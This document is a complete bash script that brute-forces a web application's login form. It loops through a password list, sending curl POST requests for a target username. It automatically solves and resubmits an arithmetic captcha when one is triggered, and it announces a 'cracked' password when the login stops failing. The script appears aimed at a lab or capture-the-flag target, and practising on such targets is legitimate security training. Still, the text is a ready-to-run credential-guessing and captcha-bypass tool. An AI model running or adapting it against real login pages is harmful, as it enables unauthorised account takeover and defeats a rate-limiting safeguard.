#!/bin/bash

passwords="passwords.txt"
url="http://$1/login"
username=$2

attempt=300

tail -n +$attempt $passwords | while IFS= read -r password; do

    password=$(echo "$password" | tr -d '\r') # In case of carriage return
    echo "Attempt $attempt: $username"; echo ""

    # Make initial POST request
    response=$(curl -s -X POST "$url" -d "username=$username&password=$password")

    # Detect Captcha 
    if echo "$response" | grep -q "Captcha enabled"; then
        echo "! Captcha triggered. Solving..."

        # Extract and solve captcha expression
        captcha_expr=$(echo "$response" | grep -Eo "[0-9]{1,4} [-+*/] [0-9]{1,4}")

        if [[ -n "$captcha_expr" ]]; then
            captcha_result=$((captcha_expr))
            echo "Solved captcha: $captcha_expr = $captcha_result"

            # Retry POST with CAPTCHA answer
            response=$(curl -s -X POST "$url" \
                -d "username=$username&password=$password&captcha=$captcha_result")
        fi
    fi

    # Reevaluate response
    if echo "$response" | grep -q "Invalid password"; then
        echo "Invalid password: $password"
    else
        echo "**** Password cracked for '$username': $password ****"
        exit 1
    fi

    ((attempt++))
done
